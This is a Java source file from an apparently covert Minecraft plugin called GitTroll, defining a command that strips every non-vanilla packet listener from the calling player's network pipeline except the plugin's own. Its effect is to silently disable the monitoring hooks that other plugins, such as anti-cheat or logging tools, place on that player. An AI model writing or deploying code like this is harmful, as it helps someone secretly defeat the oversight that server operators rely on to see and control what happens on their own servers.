package net.Lenni0451.GitTroll.command.commands.player;

import java.util.Arrays;
import java.util.List;

import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;

import io.netty.channel.Channel;
import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class UnhookPacketListener extends CommandBase {

	public UnhookPacketListener() {
		super("UnhookPacketListener", "Unhook you from all packet listeners that are not from GitTroll");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			CraftPlayer craftPlayer = executor.getCraftPlayer();
			Channel channel = craftPlayer.getHandle().playerConnection.networkManager.channel;
			
			String[] legitChannel = ("timeout,splitter,decompress,decoder,prepender,compress,encoder,tiny-" + GitTroll.getInstance().getName() + "-1,packet_handler,DefaultChannelPipeline$TailContext#0").split(",");
			List<String> channelNames = channel.pipeline().names();
			channelNames.removeAll(Arrays.asList(legitChannel));
			if(channelNames.isEmpty()) {
				executor.sendGitMessage("§cThere are no plugin based hooks.");
				return;
			}

			String out = "";
			for(String channelName : channelNames) {
				channel.pipeline().remove(channelName);
				if(out.isEmpty()) {
					out = "§6" + channelName;
				} else {
					out += "§7, §6" + channelName;
				}
			}
			executor.sendGitMessage("Unhooked from " + out);
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
